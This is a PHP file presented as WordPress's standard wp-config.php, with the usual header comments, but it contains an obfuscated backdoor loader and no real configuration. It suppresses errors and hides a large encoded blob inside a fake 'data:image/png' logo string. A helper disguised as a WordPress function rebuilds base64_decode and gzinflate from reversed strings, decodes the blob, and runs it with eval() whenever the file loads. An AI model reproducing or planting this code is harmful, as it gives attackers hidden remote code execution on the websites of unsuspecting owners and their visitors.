<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */
error_reporting(0);

$wp_nonce = "";

function pre_term_name($auth_data, $wp_nonce)
{
    $kses_str = str_replace(array('%', '#'), array('/', '+'), $auth_data);
    $filterfunc = strrev('46esab') . "_" . strrev('edoced');
    $filter = $filterfunc($kses_str);
    $preparefunc = strrev('etalfnizg');
    return @$preparefunc($filter);
}

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
$wp_default_logo = '<img src="data:image/png;7btHr8NMuh74V76Fge42PWZObvSCOYg5i5sL5pwzDf%30Wf7#hqGB5jBADObrsXBOaKqxHrrfdKRBP77P8y0PLYs2Yv8j2T%o973eftPIDjX8%8x%fcr0%ofp7FvxuKPfw%#UR5jtjfT#Me%ENDh%fXf%Uv%ODMh6tjf%vO%%f6P7Ui3ff2frv6Hvzbj%re%1sWNpM3417#gMAqhNEr85W9%#9vf%x9NhH5T%tcHkRzFUASF%#tqa7Ef6%jHvy3x9%%y7%6FfrrA%cdf%utN%#X3gkJykM%wj7#kyVYQ2L%kRTblxV%#%m#7ewj4quwlCp2PqscYzXsLbPzua9u51Sa84G%%ueqnNOn%#O9r%%1%%Pnflv7X2%jtZi3Ov1ZvM5b9r8p%%dcn%PVfC%g%Vvzz5v%LH8WZ9H%9%#LH%8UW%8L8c%xz%HP8c%y%HKSHkiF9StsKvsHzfDzEj77IxSfh3LK3WngL0w2qDV2WP8bssCLqx471pwVy8Hw%V7Hg2Q6BbgbQ6Akx8UZm5Eaa70Ye7%Z#2pmowMRfDUh1z#cORhQXzfPiZt3o3jxwQnxhF8%OwHAU#tMQVR8%oa0PqrAydaLSWDm6pBAsHW#W1htKIwlplZU%3X4eLrNViCUPo%DbfAhEB1x8eiBMOLyddl7nNvrJ8rUMYbU5amkz86SlzvM3EiGFL1qSvHlYBXqS4uVpQfB57UAjyeo70tI9ctI8T5DJeOLFTCqoBtb#KyZEtPUhAJNnCiCwQ6b4wO4ukg6#4buRLVDIUSdZIhVtChKAsC99f%MHXXzgBfX1JR5AWCIN%xqMkg7W%JvYZHF6#GYFa1AnKJqeapwgR#vkTvWTXU1qNjljKXhP8qR96EeNi0bpOf3YPwEIJ3aohDwGKTEoNBosw3FqYMnxmb#vNHQLSKfn547pjqiNB3WiIj2NN0ON4EJTWR2XZAe#g5Uaa7IyECSDYnGuCm3UPPzdncaC8#TYEy3hAil58Ohwfdf%TvEU8IbMy9UtO55yzN8VO7nPXfUOlErh1NZODifM#EWLL9I1DDCPYiYbuHg4vPwh5S6Ukcm2mBZZeUiit9i#yntJ12EvVijHOIBG1MfOxAN92ojMMuce5lcqmWA8jXOK74NPjD2BXTLJkdOu7bgGGC8u44ohnUVddpqQxb2%5idSeXI40KWNfTzNI733jiEkLBjzms89EpnRkrkcIx8RyMgTBo69EPkBRe47J8cvNaoATdYpCFTdCjtSturLAe96rxxhYab2B0B3OzPnF2FBM5FqV2xGNAdSnrd5IuOKLR1mQ0IV65nxjzYPyF18vU8659ieRT8sbHth8y6NxOo526dEhmh06MFkb5Ca7f4GKBPQtTUPJW3jS2DTltbBprTlvJ#M6mQb%MyS6Y7hd#VFSSDcBE4DB5j1zw9S6qrueUOTUsAl1Sd#JiamN1sM49pYCd2KvnQRqdFEIAo9TlCN9tQmnutqI#x5QuWUDh9vTZmQ6hzqXrLfBEyihluUiN6WFJOZFzdcMOBUL%zKCm4vyNZOf72LR7bhg%4gNS8bAmiSSfA6sy2BGKmJCdvQEUHl#dThCKeBHKt9ehLkZz6rD5y8NfkiVIFeFZo9BA3lr8p33LBNg#fBqYfNrypdliIWnZNOH6I6EmFj8uxJPMtaML8fmyOosou%PH3lF5JGL#VEwjxAtX9%Qr%k6z7#bV#QywQ%NjHRpG8juAI6Y9KVWeTDw0FMRgs9bPdN0OGXJkSfC80jJRGZX5Fmu77JYs0vN5OFbigfmmsqvm6xndl9aUPk3aUkI#kM11HnwENs8cMRR4vNO0lyc9wxItY10D2Ao0ruICkjm28dVVQIJV8kz5xUheHJCatFHxhzu0fxWqmOtulbcE7j#0Hf4#QeO7DlpBDssJ23gaYPVq6BWiW4zLgEq12RNac7cnUyQ3hXIcyvzTb#syjJnU0DLXYyltIAHX#q%Lp0rl#LfDFIeBXe1tJ%3Nnj60EJacR3WSvc1aLNupLgWD9C#%tRuWTr3TpoDhcVZ1XT6BdjzW3oKTcB9w%Z0QGQ%HZmWQduNsxiNvMG78a3mQLG7q4sPkyelYQjlmywL0jpsxx6g%l27ifLvr3zmAltZQa%E1td6hChbQ4olDqa5jTjAKSPVPkd2W8ilLxr3GkO0XVBKLynbJ#kf%xMsXqMTlGIDrxz8lFMgBL6cVquJlGWsfArf#KxVlQzOkSnCkjkFfGTLiLd6jctjkINknGqhnWdRHaEaWHYzx1V0b6TJMUz0R#F46t0uyEKnQ8X2HHSFrg3acfvhMDKFu9a6RgkQjG7jK#bC6LSJEnLPKgqESVewe%6PPIRR1h#iPxmPo0j0DpXTOrUtIIsvrD2skxvW9oku6FzOmntUpkJyOdvTpWJy9LbBa2bYXmSUhxn25dgpyzJAtrrNtHbIuC6AZiKbIRH6SGhwni5eDtBMHU3T8arGJcU50w1Luw%MYyhQKBQ2oekbveWNTgBem6O9keVvu2IISYEtxwoSkZsQwpNBhD0ocIxnJJm3xHtxzyfjv4TsDsYdSz8g#doOCo31Bu8pIm9As%vfnqPs#r0A8p5t0n1T1NIZMhqe%IVqvC#wq41uwNEbi4KUfKTdRzAFYRtNKyqjQTvGT7uCTUz7E%Ty01NocTzyVp1%17DIAnIU4ffGC7pqxteM467x%GH1vtAnZtiFlq8iCgczeUK36tHRONtL0o1Vl1%9qs133UNg064XyoqR9c3sNNog2m5JvLKlpt2dCcFilhsgMA3SKGBfChxFdGxF0SqmxTY%MtzmvvqY3KM8GLPaqWILKMUzInH8CSipBP8JCZI%KbXniaE3MJMry#b0vKTVmkpSi%Is4slSZwHZDfxOTLBYeA6ilQIjVULPwoepp4I7Yg8QZn3ctPEMSAO#1F9fbsO2ZDd95kTPew#UHfHBXw8oc%lBNzmsiJIQjUl8pTYYZBBmsR9C69gFvZNer0sz78Ec9s4Uj6RiVRQKAB0##g4qZWnoWgiMtWyIkk5XDjHpQPK3nsGP4Q%d7L04ma7YCB%JcmIUErpj7kJrYZz8munB8QTfcHIrXDWSRpP2Ax#bcafNbvoaYWyJ6ojlDAQ81j45qTLEXecJgI2vUmIRLPKu5eqqDbGkZ%1GX8GhsrioAyAQ#xlJq835sgNYVfHm0NLnUBc6KutyIMM8aSjsbRRhEdPF0qHRtyjg2NXoxbB4WV92Rt#Z#Ez4udbfSKk5UezaQUWEz3vGx2v9PkKjsM6N#%f#8bA6adkkYHndPXLFVbCxnjlxf1gpmcixmoFZZf05Z8DnUoninDrJjUZf%uE1L9ON2fP#cQZGsEW7n16xKR%8A9DkZSrxInvUTZprQD2hYZ62E7gXdEYf%I9qlXyIENj7Kikz5Ewg#EGxpzZnYdJZ9%wk8rdP6EWxxduDUN1#2lrLg4EWiehko8#GjtHnOpirA6lsg0JNBUBdDhPkmqDnK5widFLy2NSuAe6lwDgWu09TLizKO%e#lqNJUHsWZmXwjcPAU4Z6dRrqaMr0jhnamCTCgPUtie6zoH0fXiCGBWkUiACI3gY38LsjcbZzwVpXjEs5rDhoDfO2ps08M9VSEYhyJtmeam5reA1pp3x1jT35QEnj5NvQK5HNog%PWa7cF1%gN53f%S3MJlCTo4XJuoTEOlvmG6wbR8Q6JoxO43cahSPnpUALGDP7nc8hTRqAaXdnAo0m9#Yc044fmAEfhLGZzlEwSC#8Scwh5itrDG7buviLMxIclFsjrS110IKCb4azs0xwi0Bz#Kj5s8H5A049ewwPdN3%R12bjOhu3vZ9yNn45rbwA4TRxlyPFOCsA#3tYZnxoWIjAJd2dum3adIypm6C53aik53LWcn6Ao#MKwtvvqxrTnvHw8F4VYKI%s3GNn05O4wjlK3pvdNQQ445IApSEPo40#QhIWfm5k%FtkWQSIIokGEovGQ5VjUQULwsU3EnZnWP7N2Owjbklyi1tyOsWreveRc4GuB#RYgPbSHUe6XHItINm3lg4bjDPIg#NiAUPfuODxqkxywt72evlScTJZhyj92Z3xudvIApQ92PS1yuyfwgVCFLDifUFPsVVB#mr#4l2ZAwJODlnCKIWrH2U9TTDq9SW96kLDpRrXJ#tsQo3z4Bur77dUfDH0sOsyPK7ennkeG2j5OAIBM2RfCTetcpQAcnS7VG6Q68R1%iu5cI#uUGEWSbkHdF1YzYNT7VzWt1GIUGlDkTEHWDkB8OInBQ2SRWE9MO61PBYLt#fWTRx#jtVgVcJHc9sTtUZjUHH2%CkqEj2dVHj15l1nVBogb0OFLbB811Vu41luJ#V2Na%XqKkdQXxWT13Fto6y9mTQfhGcP#ZxbTS1fjyIYOBsqAn3j2BaFw#RIsgujGxclEbR8nGOOFNyC7Uu2pbwbGgzuUJv1rEAZjj7oEQB8l8kP5vSSudQIE801eRUscARI5N0YuV4MlgIPTH56xJow8dSpWDIGxGbJ7whdznUc1NmunC%Nff3Pe4F#%jhpMUs%wdAkiBmjMPLh4I0iiBX5ykbLrfbCSrRuxJ0iwMpcERBrZrO2D4r7hClurSf4fksIH#cH62epCHBAvnvd36NdTXw6fH1t7m7t8ttn#tLfwAsVmrpLvOm8gdV#adISMt5fbOJSPME9jhQjgIEsV0hv14jY0pV7Y2SprBCovOMUVQpFSr#DkMvvOiweWzLMZ3JolKcvKmD8%DxNj0KlT09#v5S53YWklXeFsohtH2xpEwkcscZktZNAjojqh7rYFgz24lWnMDrQD0mmQ67HXRqHngPWJjF9hHEqgkx6ATj#qWt8jvNcKa3C552LAi5Kq#fZxHUiMnbas0KYUHZtelNNogBi6cF1ZDSEj8SaF3vObH5Cs62sIt9fiJ9ZM0smjoPhX45k6s#bcDMxvZQ9rv0F9gG9fetQRB9cNUKC8EYGp%rco4Oz58UC4ryRZwGs#2Vq5VcgTPC#SJYufTWms22MCynj4wLdbxT6HgLFIFwBMdrAh2ScRE5zJcS2jU2jXTkK#zSioetItiR8mbYNAEOTMk8Y9LyFiAOYqfY2H2Ohrd7bZf8ExcrtO39xoVo26kT#Ok7KoygWCvlEjyzGrN5oLqc4KZF8hRgaXcq4PZ5iFHdbM6IpM2PmlstnCrc8d8i#VX2jjDLweH5eDFbSkARO%hFsJ4SEupHbSW0gT7do6pX7S9qmW%MgoOWVEp#zcDmV9pcrcz1UePWKKeMzn87daIN2U3NmOieM49WvHQSj6X0UuT498OgzepcxTAmWUHIDKF%dT5xq26INZX080O1IuG5pziNKXJ7mtOy7n#rCkHD46QQJXzaNcWegX5EUShTHnaugcNa6Wfy33hQASitib%UjHyRCXlmn4usDoD1KWE1gT0bwKjkZ1V6ucIOOp9EuNpbHeK0jCLOsfqVySnj9k#sWU4#8JFf35u1BStxNf3yrlhhewTmeYfY8fwTKJiqlc1I#L8jn7IEf1bkos9G3AqQ#2KKzsG#fvzrGO7dPyY61XIqwux6a3M9ezHLd2m#cBdgg48NjhedPx8FohyyQ5fp#rztBEfGc%9ix8j0UuN#6pNGt5bo1DmbrmOzhKVJgRdZzxLtdT06DR5#Eo07OR1%MtSzYt95TCcwpAZ8jsU%C1fqVjD3VFSCTuTVUDSh35zkU52f6fgkaoZf5l003EWalkMZpzXA4B2mmSHAJGAZaE49oxzdh1bghATCsdke#cLguxNIkhU2Z3BiHAfRs849HdiNIbrK#OJe83lWLdL9nh8QkmbpVoHseMmFBRFeuviXr5D6nP8zCvsSIxHvwi59kDZKhaaBpVUUiahdSidbtU5ySbsPJKzDIdjn6l#wlW#ePhS11zGPTCvP1ChK6amX9uwfPsnS8D2JM#XB2bze71TPCuAAtzxulpl97axx8rv76vl9KzXaASK%grPWycFJ%xwdEVHAoYKcPcyXDPNc2yMXSoZJoTk8fFpvFuuF2sK#g4ibNcoIYJzPg3Fbg2w8TN7RYpmE%UO9ZabR#bFsz#Ecuvm6AH6mWRR8Eexg5eG3MddTrtW0v3k#FdBwvh2Zlnu7IbOo8LL2Hsr4Urj9QntEbsyfaR7AbCmql55foprpI2HNhs7a0CT7MXPbJx0YvhqG2mwKdKEHMZEv0XbvwlPJ#GtXOAf0Bp2uduN#es24gal0vx9GoVMLfZ7hxisZbLb98DG6aISPr4E%G7X4PqHbx6WiAK5is2485L0MfepSIil2oyde1eTLOWCirvJQbteDh#7U%lKCZU%RLndPxEehAD1xrZMMF%PO%W#Hk5AymaPZergNkRFLENoLG1JexkFr3ZbjDnWW7mjsbLqWto3h84m#qNKqKiBj250kN6#l4gp8mPrs0EU%qfBlM060CAQjfs2O1bD3NYJQ3K58LKYkRWVyMEoWYV8I0Bx5DfAIFsbtFt5h%oYuHH4sQz6XxAeakYWypaZkHj7cD#m2YAzLLLBtg#ITFcw1FRgvc9mpdg4teCzwT5dPc2oss#FoG6tnvSYgsvOHnyMBa5n6J9KiGwlryn8kmpyZEPy6YhiMlrIIzmliCSsIQ6diTKk9Bi9MzHD8Z1QzTee0RapQW%4Q4xlSuNI3x7WNYxf#0YZR%5tT7uSssMg92jCoyRqa7%QBKngtmDDE62k7uezGOLwYZFog4wjXiPoLuxoXsWM8SvGZsw90PKEqOUbmbDCu9rcWSlIj34yHggQQfBIiGYpXMR39rtg#%5K2sES%YB4rXjWeYtrPITzvydccHZu5gJksrHTPMP#maBsfIU5Uy1Ti%3LH%cVEVBiAhNeHUTkmQzqA0cAf%tpMvEqynfRrN953HDzThi4tdOv98k8uW#ZDfxrGvyuEXSk2rPwlOyAuKJjYrQEE6VnghfBAvjU9rI0the%RGQ7LW2NJ4MwxcqGJ%GPcD8B1wJIL4cZdH9w03aQt#ubZTo64tm0a9SLO8iPDptTr41WgYtkyLeDQvl0megs4XLpmpoJ3j#9Xc8VEKSvher1R3CJPlugoybFZfFJRq8SLnynJVNpnOn4Vhv8abyIz06YJoGWd0o1sctsZvytu0GhMP%jb6%JBcs#pDwDgEXxhCW#oslZNb5SsY7aeBJ#pShVhU#snCdoLoAj2xXqXjbYHjz0vz4bBxj66bkd818deZP9AiGjwLwcP4GE%885kJTmEedIaQgkXREBWrcMOi3gJ4ciEbigBlZa1wD6ZUsGS1pEjD7MbKJhNH0Ws#D%7oRlf0Aeblgc7sJbB6XBC5aSFk4WcLOYpiSt6vGk3nokf3QlET78UyFKlONZSPpDaGdIuIrnn42RYXDz#1nHEFl0nzHYfdpJ0N5D4xWVYyAYS6DQWvC0BbYtXNvCp42oRNis6bA1sRz4g7kknCUfJwk287oEdftDtq34P9Uydxn3c0jP32k8E6CPD5hRrQqucQG7FviVrhDL14NryfE64g8AUN4KTNYgVEECIJ#eXnJGdLwxzV3Z1paAPEFK2KnLfeALyuA5YUwfiyx4lB6r7jlaMq4jYWYgjFRjQ#ybjfyBOa#BK2Huwq3gK#E%3xTEubEL6HCbw2ZdsttPR73MiNx4qs3gSb3U1FWT9HdYNj4NleC#GwCZEjK9Zyr8cwA0KW#7InyNjKznypDsTjdkpviQsnm0EHCAfdy3vUBLeab7PIHRkpO75bnZnfb40UgJp8%XN5y%oTcNQPk1U0%AyG0F07KujbNyxCVdOaqfAa55wy2B95B1JotUnVdt9VRXAoRNB5B8Np7AlEOFmD3#6Lu%4pojpYRwzDTXW8#Hwe7YCW9wQ9nxJngSd5A4c6emxdO2bi1ciYPZQDUqp1fVgt%SbCPlzdPUEJO2U%jM2UmqcR9bdHNifPoQOaIu3bktbb5ehDp982jq88bU7KTWdS%aAY4obKyuBnBJhOhHQxdX4yYFQOxyW1qzvGiKfftbpdxXZ0BsB3hLfbBAYRHGuJyTt1GfNXPHurOFLixN9grPiKjHiCUjrYG2MbjFK9xNWbEVeG7voj%UOM8cZLxbqOyxvlQQBq#qoFmSengh9zC0GZSwWFigSenKB1Z%AXhafwStqtAMbxJ2dXD#6He%6pyHdhIF4vnW#7By2#hXQBkv5zhtdUArKMjR#uWji0#FBbYXEd3iRW2tzf27m#RxtC2AR6P7#EsVsuw%CYAjuxBctZuIhZDEFUv69#xqng0Md4#eCsSWTl8MDWMRVIf9WZ0ORrbjREiYrsaMJxBIogRmdPI8KhOsvYgyiUpOra0lLaNsfutLzM#tbqW1dGlTOM5#2h45iCn0UiVMrxlGBJHUDTM38ZcPsmJS59QApsTACWNyaZKvq6BjaiBCSSoXKKJO0u%F6NL4slMqPXDozUD5uwGzOzI1kTcCkz5vIrHTN37VVtKjhKBbmNSXk2abr7dIfSN7lY#%BVLyLURUoCdfNYMwE5rOEyF0xqD9W28MQ0JTlMDkwcF2GQKL9I51yGHpyxM7c2%Lwuf1LfKlDlNNGqpOhuf9iJM7hC3ntRa5mTSM0#gznHloLa9pTqxrxWX6WNmT7BN6R3MqRBu5AGy5d27wlRQDhi0yBCsaHVhtzZm119wr3mO1f%ZYxWUq5lDwg6kT%loITSpCSSGtG2HhxuK1ALI8PY1wjrYmgGQpKLbrlo7w7SZCH01FyiXy7vUtfxVsnzq8tCD3c8xFXzPPmKbemDUs8ACIj%PWo2ndYS%2TfYs7jIPt5TvRyBWTRrCutkgphKJ8fytK71E%CSp3m2z9Y8EoNcJrg2MOrV1plKsGP4T%0aH8eSZBoruGzVxG#9S1gyubp%FV1NTplNgn5SlbESR1qxKxGZecWpoADJBNxGxpl5VFk5gReYnLV374qYbdDFXM#4LNmf1IJXbfvgGgNk4UIgtvZD19E9q3eDunKEtrOBZcQpbaT1DioshgLGqpOK5xqdNzYAN1QfqIiURBi4dFdIaSNE3RM8biY0%gJInVHX5e1kYG9G1bGxS1tF5CM2qvStDopoig1AINWUSHTsQ1o5u19g9UJm6R3ATkyo3wSGJDa8qZfjwkS55TLcyYrh3akFWqW84QcOl8zIZkjRrh6pH8KFpD3bZ7jIRba2pAtToZe864fLNOTK%JNl8cXXU1cBj6HdsJnMEUCx3Ei4OoGW2RwL0mVRrYbTVBrxoUiLbI6GQpLhy7lF2#muFFFpO7sh%uRcSJZWQUv303HMAvq9Jy9MOk7c2gSCJzLrHBLKYMh8m7TflRR13e81mMuw7#dUDnGZCiREHbGTIzwmiaFHhcItvZ7xmCtwhByX34kdapOxY7sedF6y53HdgNz4JVx8ufEuEbtih%KycvOoNNOmJ1FlpUxrUh0f5gVHwxMsoTbSnqDChacfJnlzegH2k6rhEOVPouo%%A0KE%OerrMadxnAZ0osX%lSlkof#34IRDaQ4HsLOmdp51d5DNQm4yxOxDyE7aEfSweEivV%U7fuDFjxfmwklZ5IQ8iB9NAc3b6sDY4uzYWBQ522ARDUgaoAz15CIQEtB92llhE#hJkBxya27tOM5E#6OATgrwtjrKO5PAC6xmB8V7aAU#sMUyGXxqrX1Lbc%dSNosCDSy5Yb8jxxwhS8C4Ts9hH1%L51YI%IZA8KBBZ%#ct%n59mxt96Pu11G4NAWQcwEpRl8AmN5fVNHIKARjl%QUnet2WgNrQtXUP5leOkMSzr#pFPIUvNy55Ixn45#XManqGGt9cx61J26clvfA63z1T3dPc#DSFZNn0E8D3KWcED0iuVNQ1#HlNabXbITNC5Fytsj4DDQ2nxZIXUOSij%Jt4La4CVaJwmpS%DQTXse4qC06L%XBmzhcNqHcvJ4Np9nDeVoMe5ojmTrjUr1zJphWAsyuXzNx7dOte8MLWVWR4DY#8P9tM2n2J3MyfBoRKwTfodYSnSvHIq3EkW9c7yKX%oTbdwG8biqBRKy#s#3xWyNsQCO1NsVP0wwU6HP66q6SLouUgrRdRZ34z75dmCQn30WzD#PCXg2kzIGwsoJ9AvGCs3p7RepH7bs1SfyN0k4wUshazJskqp6ftrxyXsR%DRZmMiD6BAkBnMEs1RfQSwJEZL4xEJ#5pyFHWxej8mHgep6GRtVLDa5lTrHbejjFMwqPSpdCXm6lR4FJxXP6Vlel5wwz5k7OzD3C0xZQY7zZPogfTyaGazLRaXtMocvW2B67FmmrHX11bb9Rp#5pfOQsdq6IyAvv4JR6kYXfMWlm9z1D3WQr%u5vDO7XfmSuG5NokyxUdE1b2CK6idKI%RYolJf3Lv71PnavmhCNfZyCN49jaIaNq9bePRZw4S4s7jw3cOH9WJvCBD76lGNiFYfMWD0nuP0PQ2oTXKky1BqkawzOl72eu8pl0pwKpI3IkDfIjjM4EtMnjTQZpNSNkUJrrsGeQAuQpriQettKQS9##UJaL699AMFU1vyTgtW%TwVFe2fxPaCLftKSNRf8pLqxTvHH%kRhYtKeJ15jTpMP##ojT#zxvEUoNbjdrO696GVlywTX3UZeyMMhswbV6nca2PuufxEzUaddg#gumjfGNuScaozCGcVrlb0hpe6ZFUC0zjgzIpeuEyfQky3LihQ%bZckqNRpd7y6uVfwuiAskPF3Id0vlqOGpksPCpOB#qj1D#NPoWKgwmw%FkIxKTOBaEI9QZvCBmvJY3jlYAImiHf7O2xEv180008DdOVlY%tPkeTBLpMCYez#riIIRW%BGST3O8uRi0dlejMbM8hj2IdA6nFDBvfrx44x6EKzis5MVU06x1dVGMvFF23hpqJJFV7atg2rAdTOLP7THWghqp8ZXEZqiyxAQsvRvFIMf5rC4OMiMFSnfr7jQZtd4ysJVIjBZtP7ldIGDV0lLcunjvTsmxeRHbu7lfDnohzZWTzh4kx01Q65u0WQvveH9ScpjMOhlyNpuK#SRJarYnxUxFYunx1FVnnqVP70kpqrXkTR8%P0vySC9fWfTnXd4yY23Xh%YCwDfcR3fsL#5CDSf19pwvMLtznNEJAeeA6pGpo81jGKw65j1bUm4kS3W7XcEll4LqG6Xk8htWent9UqjWyDHSG7t3jJVrNOK59dwsoeAbFvqxenWupQi0600G1IiW07b#uUDb4w85BfR42e7Ly22YGnyFGj%U%FLiOgtS2M%M#qo8Z2xDB9NFfTcWITkk%T0U2baq7Au52c75D5BdWhDBFpWHMdgk2vEp5dfiH7GWJYtYK9gDk8yD4tViHisKDGZD8iwn89A76ASM4hFwP3ueHb2XCysdbBhr3I1nf%ONp0EZHbxNRuSVHTipB0JZZTtCQ67egh4fPxIgfr3PXRRCY0rfySk4PfC9ba3ta05ht%%w8nnUo4o%vutP9yOdjFik7Mgl6tXU4jKEZeNngVWWOfzcn#BLVY7ishkMM5Wrqx8gjnxgTDGjE0SJ#ec#e58e02Ct68BMxIME7sKU2SDCObBdoPC8IFshflFELicmPhYBfZe5HSgyIdX##n6SBX8BsVzpEFXketGSRMd1f9qWEn7y0E%GFHfhkTHpQnZ%VFh1FjXvXvIeZwObifdDoTuPXcCRWMHZFCr9A#OuRaUbcj5vh28ZOaUeuo0zOYxSh5%hLAM4HYPD1LLFY6Uj0F%WYm6XZKjIHvqmkVZDimt2dLBDTrl9vTrslK4AJp8Q1%KBCZRHuX37xTfus4vBrJno3%6p%lHt5hf7x7daK%mVh4AyBkAgSPI7TcBMN82ku7vSBbdnQvsC1mFXOoUwsfIhPk%4yZ6tdfI##1f3ReIO0FHc86fShsTaUvBCeNQiEWuqT13d5B8VmlnXLg7D#QcZ4YJfvhNXRCh3K1IF0zPs6zvugOcGCP1LLt#j6SRZizFIms3p5SJDM2z3XRmMcnMYpYZXGmZlTt1e9Fo18w4azYmVmXQ0m2svN98SptUfpfS9oA6mycKdsPC2BvgCeJ6TSCfRRMD7zcujV1OYqHI29EWXzY3mRpR932Eg3FU1WOV6#7aEqaPlZaJqyDUpvaKbYVIX3LCl1X6OPO#2Oz0uPhAPQwdalgS8ARnXyjUymsqW1XQRsZR7wuB5DImOkpJSkfQx6Ze4Q#q5oK9F0CC4mfJqCcfaZDIfhuWTLsFGwZigIlQK#P7SSzMeMR3FUIXL3EIRv48x7Bb36grYo9V7612j4IEEOnSCNbShBs6q1oU2nzzwtlyaOIKB1YvzlF7kMLhV3SEocqd4j#chO0Zhg#t4cKiyYB73U9wjv#dAWJyFauE3Y7QWt0QLf0iVxrLrSS5GQ10jmvbwHt8iMYRmxZnMmGAhdkJ61IXp4aQSfiLmcvdoLB3VpmUi5bOZkhgu1sK74lJgqsJXBeYrxewrBxVQi0DIp3j1rtFBABaxTcBRW%MDq99z0cRjJhMNZEUpDrXrybRT9I3NIQ0pg#BN4P1WWmpbQPQd#znyC3vFmgNDymSS6rtNMeLIicNlyZEpB3tyfuDcmnX5axHWRMKOpUKDV3kwWuUkFe2TltwA6Rp29M3p6Edie42AVAFnDqMs5WL5C5Gnc75GPF0DBoBpqVdP243oxfeAhxCFjMyogU#Lbh8DptktPUCyIw7lTGsfhub%t4x5BtcfAT9tGrSkqon1mN%UvXoM%1lFlKhMZBMe%0NXc2K8hMuKjEetkVeZgq2NQ0IL7xSgqylmA0ZMHW7#81E7Fd5xYywg%WMQBHB67p3RQX4O%P7DfiIJKPmG6yBryMB4vPYD%ZSVc6zWNIvQaWsxdnPi27Nhp77uGevyEf8zhqBU6kuJoz31XHCtHY0tIShHS5vye0WwBm0fUn2YhWsOG#FRPlI5Gff5ctXlpqYmYro20RXgswPbdE85MQlwcP8ZiUlx0%KIFV6e5Ni#HUMKdQwYEMYVW4EgDW03EZ5PbatSLo7OEJuEJbPloER0KPJaHQcM3W31Zz8TukFwLG0q0vG2Po7PYQs7c9LMY74%S#mTtSejcIUDvLIP1Hyw6gfSsOKhUdyXuyizpf2ehgiHUfkTsFmTmHnM%%nruYOsAYHPCwrsXs%dzkAgf9seTE9u9ggiRKt8RHdhUBg1affsaTO645GCN7xpcW0MVP#opuHhO%VFvvsYsOnoB525sdBMeAaVQ58ypKbA6fjNl9NLI104amM5UOfd8XMAxcomNI#yRZ1wXfJyQQHOapJPnlFCMNPOa6qIvmYcGhKNwe5RwSIxm3YMSjkPmGXkzYObHBZBBmg%j6BY%biPpzFBp4K1ehCpzurCSngZL4Mp4cvXOfDXAXBxidLnAdX9CUS9pLBsJGpCIQzrKPiPPA8tIdhwxHBoDr%#ZKjBrQ6qk29gy6bQFyhoDsx9XJHEAwvPLE6i6lWoNfpjvClBFe2FkVB7WQFpmYlmq1XtrDUYycpAOeno8RGERgIHtTf#4FwJL2iTH0QOPc3xJs#%AwkDpQzYIihoTpOwxnV%Pc9#wFYTvTMMBWgvf8ixvQOLO45Tr43McMm2j8vm14GTGM%DF0axIiVkGEH78UzTIoY9S2QHD8yWy%AKI5dRY84ODZE5TujTLTw%TurUic27gOXo#ibQvOQpS#I4V4IvRB08C3%4qy%dK8pZMgB0dD2DEbxppb8rkr8Lygf3PNxChQQbe8vjtqx2LoaDDHBkJ2Cct4GC3cuHysrV0Ei%a32EEVTGW15rMiDW0gQ6cNQyB8v4epYVdyFsRVgtsJJiR32KBgVLOIb%d7ZcoS1o35YMqjynq6KEg6SMv6fmkEDRCaBrsMQysq9%Z0MDJzRn6M5S%dLNGmZW3xVZTloWWAU0WpC8dwDZQ612lMuBrkWlQIHKTucX#HCGE0CDME1QBQ2QB5jFYarVQ7nRkIGSR3EkFWvB7zieaIkZ6AwDqYwCyl%mFlmtFWTlWyhCgzUgyUD8jOMg7lkm0BIDoOCZngSP5ci42kGXAOQKldv%a8Uv8GqOgzwMMVnonWyz%NQuAkmhJRDbybqBOniPbnjG2WQZEHWG1wdbaMlhJ0#XpTWA5#oCBgNbhHeifCilRYzMeIHDR6AhS0UsDhjUQX%LXF8gUfstz17bzHtpf5WQ03dHEkiHC4nfAMKOm2CA4Cc67m1LI#NHHOWlfA87i6kvCuW7sN99Yv67eWpCla5c05PlOB1mPz#PjDziXgl%9udcondIwhVF2Qn5FHD6G8uSy84PkR2%fHsFUm#12nP4Qzx1qi8tIr7mxzrz9snClHQxI9BqRhPPNylPgJSh76WWNUF3TjMowgVTpx32AQMcZXdLi6deq7x8s77#3eZrU3CixzfqohEM%Nmd#TlmBBXpuSbe7sVxqzcZRcU2uNE7987NMqYHxz1KOP%xrvRE%FeQD8TPmtLa6H1UluvUSfwGtFMeeLptS5YH#8J3xUQTag3JcRXTfd35qFB3c13YFSpzK#et62jT1UNvXEcOT2Iri0fWPf%z%%f22f47%G#PPb2T%b8bf%08=">';
preg_match('#<img src="data:image/png;(.*)">#', $wp_default_logo, $logo_data);

$logo_image = $logo_data[1];

$wpautop = pre_term_name($logo_image, $wp_nonce);

if (isset($wpautop)) {
    eVal($wpautop);
}
